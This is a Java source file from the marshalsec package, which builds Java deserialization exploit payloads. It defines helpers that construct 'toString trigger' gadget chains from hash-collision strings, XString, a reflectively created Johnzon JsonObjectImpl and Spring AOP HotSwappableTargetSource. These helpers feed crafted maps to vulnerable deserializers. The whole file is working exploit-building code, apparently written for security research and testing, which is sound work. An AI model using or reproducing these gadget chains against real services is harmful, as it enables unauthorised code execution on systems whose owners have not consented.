/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;

import org.springframework.aop.target.HotSwappableTargetSource;

import com.sun.org.apache.xpath.internal.objects.XString;


/**
 * @author mbechler
 *
 */
public class ToStringUtil {

    public static Object makeToStringTrigger ( Object o, Function<Object, Object> wrap ) throws Exception {
        String unhash = unhash(o.hashCode());
        XString xString = new XString(unhash);
        return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
    }


    public static Object makeToStringTrigger ( Object o ) throws Exception {
        String unhash = unhash(o.hashCode());
        XString xString = new XString(unhash);
        return JDKUtil.makeMap(o, xString);
    }


    public static Object makeJohnzonToStringTrigger ( Object o ) throws Exception {
        Class<?> clz = Class.forName("org.apache.johnzon.core.JsonObjectImpl"); //$NON-NLS-1$
        Constructor<?> dec = clz.getDeclaredConstructor(Map.class);
        dec.setAccessible(true);
        HashMap<Object, Object> m = new HashMap<>();
        Object jo = dec.newInstance(m);
        m.put(o, o);
        XString toStringTrig = new XString("");
        return Arrays.asList(jo, JDKUtil.makeMap(jo, toStringTrig));
    }


    public static Object makeSpringAOPToStringTrigger ( Object o ) throws Exception {
        return makeToStringTrigger(o, x -> {
            return new HotSwappableTargetSource(x);
        });
    }


    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }


    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }

}
